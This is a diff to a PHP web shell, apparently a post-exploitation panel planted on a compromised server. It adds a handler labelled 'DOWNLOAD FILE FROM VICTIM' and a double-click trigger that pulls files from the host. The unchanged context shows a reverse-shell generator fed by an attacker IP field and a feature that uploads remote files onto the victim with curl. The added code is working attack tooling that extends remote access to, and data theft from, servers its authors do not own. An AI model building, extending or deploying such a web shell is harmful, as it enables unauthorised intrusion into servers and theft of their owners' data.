@@ -293,6 +293,7 @@ function listDirectory($path) {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && isset($_POST['uploadPath'])) {
+    /* UPLOAD FILE FROM PC */
     header('Content-Type: application/json');
 
     $uploadPath = realpath($_POST['uploadPath']);
@@ -321,6 +322,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && iss
 
 if ($_SERVER['REQUEST_METHOD'] === 'GET' 
     && isset($_GET['urlUpload'], $_GET['urlUploadName'], $_GET['uploadPath'])) {
+    /* UPLOAD FILE WITH CURL */
 
     header('Content-Type: application/json');
 
@@ -353,6 +355,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET'
         if (file_exists($destination)) unlink($destination);
         echo json_encode(['success' => false, 'error' => "Failed to download file: $curlErr"]);
     }
+    exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download'])) {
+    /* DOWNLOAD FILE FROM VICTIM */
+    
+    $filePath = realpath($_GET['download']);
+
+    // Optionally restrict base directory:
+    $baseDir = realpath(__DIR__); // or wherever your files live
+    if (!$filePath || strpos($filePath, $baseDir) !== 0 || !is_file($filePath)) {
+        http_response_code(404);
+        echo "File not found or access denied.";
+        exit;
+    }
+
+    $filename = basename($filePath);
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header("Content-Disposition: attachment; filename=\"$filename\"");
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($filePath));
+
+    readfile($filePath);
     exit;
 }
 // ! FUNCTIONS STOP
@@ -673,7 +701,6 @@ $services = [
             });
     }
 </script>
-
 <script>
     document.getElementById('uploadFileInput').addEventListener('change', function() {
         const fileInput = document.getElementById('uploadFileInput');
@@ -713,7 +740,6 @@ $services = [
         });
     });
 </script>
-
 <script>
     document.getElementById('file-tree').addEventListener('click', function (e) {
         if (e.target.classList.contains('folder')) {
@@ -737,7 +763,6 @@ $services = [
         }
     });
 </script>
-
 <script>
     function genShell(shellTemplate) {
         const ip = document.getElementById('revshell_ip')?.value || '';
@@ -807,6 +832,22 @@ $services = [
             alert('URL upload failed: ' + err.message);
         });
     });
+</script>
+<script>
+document.getElementById('file-tree').addEventListener('dblclick', function (e) {
+    if (e.target.classList.contains('file')) {
+        const filename = e.target.textContent.trim();
+        const selectedPath = document.getElementById('selectedPath').value || '/';
+        const filePath = selectedPath.replace(/\/+$/, '') + '/' + filename;
+
+        const a = document.createElement('a');
+        a.href = '?download=' + encodeURIComponent(filePath);
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+});
 </script>
 </html>
 <?php
